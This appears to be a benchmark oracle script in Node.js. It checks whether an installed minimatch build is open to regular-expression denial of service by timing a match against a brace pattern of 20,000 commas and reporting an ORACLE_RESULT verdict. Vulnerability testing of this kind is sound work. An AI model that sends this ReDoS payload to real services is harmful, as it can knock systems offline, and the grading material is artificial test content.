let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function done() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

try {
  const minimatch = require('minimatch');

  // Benign API checks first.
  const ok1 = minimatch('alpha.js', '*.js') === true;
  const ok2 = minimatch('alpha.txt', '*.js') === false;
  if (!ok1 || !ok2) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'benign_operation_failed';
    done();
  } else {
    operation_completed = true;

    // ReDoS trigger shape for vulnerable minimatch branch.
    // Keep bounded but large enough to separate vulnerable vs patched.
    const pattern = '{' + ','.repeat(20000) + '}';
    const target = 'a'.repeat(64);

    let threw = false;
    let result;
    const t0 = process.hrtime.bigint();
    try {
      result = minimatch(target, pattern);
    } catch (err) {
      threw = true;
      result = 'threw';
    }
    const elapsedMs = Number(process.hrtime.bigint() - t0) / 1e6;

    // Vulnerable build is expected to be significantly slower.
    const thresholdMs = 250;

    if (threw) {
      exploit_succeeded = false;
      evidence = 'malicious_call_threw;elapsed_ms=' + elapsedMs.toFixed(3);
    } else {
      exploit_succeeded = elapsedMs > thresholdMs;
      evidence = 'elapsed_ms=' + elapsedMs.toFixed(3) + ';threshold_ms=' + thresholdMs + ';pattern_commas=20000;target_len=64;result=' + String(result);
    }

    done();
  }
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_module_failure:' + (e && e.message ? e.message : String(e));
  done();
}
